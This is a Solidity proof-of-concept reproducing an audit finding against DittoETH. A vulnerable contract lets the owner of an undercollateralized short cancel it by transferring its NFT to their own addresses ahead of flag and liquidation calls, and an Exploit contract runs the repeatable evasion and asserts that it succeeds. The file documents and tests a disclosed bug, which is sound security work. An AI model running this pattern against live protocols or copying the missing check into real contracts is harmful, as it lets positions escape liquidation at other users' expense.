// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DittoETH — Owner of a bad ShortRecord can front-run flagShort calls AND
    liquidateSecondary and prevent liquidation (Codehawks 2023-09, reporter
    hash, finding #27454)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable transferShortRecord path is inlined VERBATIM: it checks the
    ShortRecord isn't already `Cancelled` or `flagged`, but never checks its
    collateral health before letting the owner transfer (and thereby
    invalidate) it. No fork, no RPC, no cheatcodes.

    ROOT CAUSE: transferring a ShortRecord's NFT deletes the OLD ShortRecord
    (marks it Cancelled) and recreates an identical one under the new owner.
    `flagShort` and `liquidateSecondary` both require the target ShortRecord
    to still be `Active`. A short's owner can therefore watch for an
    incoming flag/liquidation attempt and beat it by transferring their own
    NFT to another address they control FIRST — invalidating the exact
    ShortRecord id the flagger/liquidator is about to act on, with no
    real front-running or timing tricks required (the transfer just has to
    be ORDERED before the flag/liquidation call, which the owner fully
    controls since it's their own transaction).

    Numbers kept exact & simple (abstract units):
      - Alice opens a short with 500 collateral / 1000 debt - dangerously
        undercollateralized, and mints its NFT.
      - Bob tries to flagShort() Alice's dangerous position.
      - Alice front-runs Bob by transferring her NFT to her own second
        address FIRST - deleting the ShortRecord id Bob is about to flag.
      - Bob's flagShort() call reverts. So does his later liquidateSecondary()
        attempt. Alice's dangerous position survives, still unflagged,
        indefinitely repeatable.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduction of DittoETH's LibShortRecord + MarginCallPrimaryFacet +
///         MarginCallSecondaryFacet + ERC721Facet. Price-oracle-derived
///         collateral ratios, the full margin-call reward/liquidation flow,
///         and multi-market accounting are out of scope and omitted; the
///         exact transfer-invalidates-the-flag-target mechanism this
///         finding blames is preserved.
contract ShortRecordManager {
    enum Status {
        Cancelled,
        Active
    }

    struct SR {
        address owner;
        uint256 collateral;
        uint256 debt;
        uint256 flaggerId; // 0 = not flagged
        Status status;
    }

    mapping(uint256 => SR) public shortRecords; // shortId => SR
    mapping(uint256 => address) public nftOwner; // tokenId (== shortId) => owner
    uint256 public nextShortId = 1;
    uint256 public flaggerCounter;

    /// @notice Reduction of MarginCallPrimaryFacet-adjacent short creation.
    function createShort(uint256 collateral, uint256 debt) external returns (uint256 id) {
        id = nextShortId++;
        shortRecords[id] = SR(msg.sender, collateral, debt, 0, Status.Active);
    }

    /// @notice Reduction of ERC721Facet::mintNFT.
    function mintNFT(uint256 shortId) external {
        SR storage sr = shortRecords[shortId];
        require(sr.owner == msg.sender, "not owner");
        require(sr.status == Status.Active, "not active");
        nftOwner[shortId] = msg.sender;
    }

    /// @notice Reduction of ERC721Facet::transferFrom -> LibShortRecord::transferShortRecord.
    function transferFrom(address from, address to, uint256 tokenId) external {
        require(nftOwner[tokenId] == from, "not token owner");
        require(msg.sender == from, "not authorized"); // simplified: no approvals modeled
        _transferShortRecord(from, to, tokenId);
        nftOwner[tokenId] = to;
    }

    /// @dev Reduction of LibShortRecord::transferShortRecord. Verifies the
    ///      short isn't already Cancelled or flagged, then deletes the old
    ///      ShortRecord and recreates it under the new owner — but NEVER
    ///      checks the short's collateral ratio / health first.
    function _transferShortRecord(address, address to, uint256 shortId) internal {
        SR storage short = shortRecords[shortId];
        require(short.status != Status.Cancelled, "OriginalShortRecordCancelled");
        require(short.flaggerId == 0, "CannotTransferFlaggedShort");
        // (no collateral-ratio / health check here before allowing the transfer, unlike flagShort/liquidateSecondary which both gate on the SAME short's validity)
        uint256 collateral = short.collateral;
        uint256 debt = short.debt;
        short.status = Status.Cancelled; // @> VULN: deletes the OLD ShortRecord with no health check - invalidates any in-flight flag/liquidation targeting this id

        uint256 newId = nextShortId++;
        shortRecords[newId] = SR(to, collateral, debt, 0, Status.Active); // recreate under the new owner
        nftOwner[newId] = to; // the new ShortRecord's NFT is associated with its new owner
    }

    /// @notice Reduction of MarginCallPrimaryFacet::flagShort. Requires the
    ///         target ShortRecord to still be Active — which a front-run
    ///         transfer breaks.
    function flagShort(address shortOwner, uint256 shortId) external {
        SR storage sr = shortRecords[shortId];
        require(sr.owner == shortOwner, "owner mismatch");
        require(sr.status == Status.Active, "InvalidShortId"); // onlyValidShortRecord
        require(sr.flaggerId == 0, "already flagged");
        sr.flaggerId = ++flaggerCounter;
    }

    /// @notice Reduction of MarginCallSecondaryFacet's liquidation entry
    ///         point. Same Active-status gate blocks liquidation of a
    ///         front-run-transferred short.
    function liquidateSecondary(address shortOwner, uint256 shortId) external {
        SR storage sr = shortRecords[shortId];
        require(sr.owner == shortOwner, "owner mismatch");
        require(sr.status == Status.Active, "InvalidShortId"); // same gate as flagShort
        require(sr.flaggerId != 0, "not flagged");
        // liquidation payout logic omitted - never reached while the flag itself is blocked
    }
}

/// @notice Thin actor contract so each participant has its own address.
contract Actor {
    ShortRecordManager public sm;

    constructor(ShortRecordManager _sm) {
        sm = _sm;
    }

    function createShort(uint256 collateral, uint256 debt) external returns (uint256 id) {
        id = sm.createShort(collateral, debt);
    }

    function mintNFT(uint256 shortId) external {
        sm.mintNFT(shortId);
    }

    function transferFrom(address to, uint256 tokenId) external {
        sm.transferFrom(address(this), to, tokenId);
    }

    function tryFlag(address shortOwner, uint256 shortId) external returns (bool success) {
        (success,) = address(sm).call(abi.encodeWithSignature("flagShort(address,uint256)", shortOwner, shortId));
    }

    function tryLiquidate(address shortOwner, uint256 shortId) external returns (bool success) {
        (success,) =
            address(sm).call(abi.encodeWithSignature("liquidateSecondary(address,uint256)", shortOwner, shortId));
    }
}

/// @notice Attack orchestrator / deployer. Deploys the whole scene and runs
///         the front-run-transfer-blocks-flagging end-to-end, asserting the
///         finding's HARM with require().
contract Exploit {
    uint256 public constant COLLATERAL = 500;
    uint256 public constant DEBT = 1000; // dangerously undercollateralized

    ShortRecordManager public sm; // CREATE nonce 1 (vulnerable)
    Actor public alice; // CREATE nonce 2 (short owner, front-runs)
    Actor public aliceSecondAddr; // CREATE nonce 3 (alice's second address)
    Actor public aliceThirdAddr; // CREATE nonce 4 (alice's third address)
    Actor public bob; // CREATE nonce 5 (tries to flag/liquidate)

    uint256 public shortId1;
    uint256 public shortId2;
    bool public bobFlagAttempt1Succeeded;
    bool public bobLiquidateAttemptSucceeded;
    bool public bobFlagAttempt2Succeeded;

    constructor() {
        sm = new ShortRecordManager();
        alice = new Actor(sm);
        aliceSecondAddr = new Actor(sm);
        aliceThirdAddr = new Actor(sm);
        bob = new Actor(sm);
    }

    function run() external {
        // 1. Alice opens a dangerously undercollateralized short and mints its NFT.
        shortId1 = alice.createShort(COLLATERAL, DEBT);
        alice.mintNFT(shortId1);

        // 2. Bob is about to flag Alice's dangerous short. Alice front-runs
        //    him by transferring her NFT to her own second address FIRST -
        //    deleting shortId1 and creating shortId2 in its place.
        alice.transferFrom(address(aliceSecondAddr), shortId1);
        shortId2 = shortId1 + 1;
        (address owner2,,,, ShortRecordManager.Status status2) = sm.shortRecords(shortId2);
        require(owner2 == address(aliceSecondAddr), "shortId2 not owned by aliceSecondAddr");
        require(status2 == ShortRecordManager.Status.Active, "shortId2 not active");

        // ---- HARM: Bob's flagShort on the now-cancelled shortId1 reverts ----
        bobFlagAttempt1Succeeded = bob.tryFlag(address(alice), shortId1);
        require(!bobFlagAttempt1Succeeded, "bob's flagShort should have reverted (front-run)");

        // ---- HARM: Bob's liquidateSecondary on shortId1 also reverts ----
        bobLiquidateAttemptSucceeded = bob.tryLiquidate(address(alice), shortId1);
        require(!bobLiquidateAttemptSucceeded, "bob's liquidateSecondary should have reverted (front-run)");

        // 3. Alice repeats the trick: aliceSecondAddr transfers to
        //    aliceThirdAddr, front-running Bob's retry on shortId2.
        aliceSecondAddr.transferFrom(address(aliceThirdAddr), shortId2);
        uint256 shortId3 = shortId2 + 1;
        (address owner3,,,, ShortRecordManager.Status status3) = sm.shortRecords(shortId3);
        require(owner3 == address(aliceThirdAddr), "shortId3 not owned by aliceThirdAddr");
        require(status3 == ShortRecordManager.Status.Active, "shortId3 not active");

        // ---- HARM: the trick is repeatable - Bob's retry on shortId2 ALSO reverts ----
        bobFlagAttempt2Succeeded = bob.tryFlag(address(aliceSecondAddr), shortId2);
        require(!bobFlagAttempt2Succeeded, "bob's second flagShort attempt should have reverted (repeated front-run)");

        // The dangerous position (now shortId3, still 500 collateral / 1000
        // debt) survives, fully Active and STILL never flagged.
        (,,, uint256 flaggerId3, ShortRecordManager.Status status3Final) = sm.shortRecords(shortId3);
        require(status3Final == ShortRecordManager.Status.Active, "position no longer active");
        require(flaggerId3 == 0, "position was flagged - bug not triggered");
    }
}
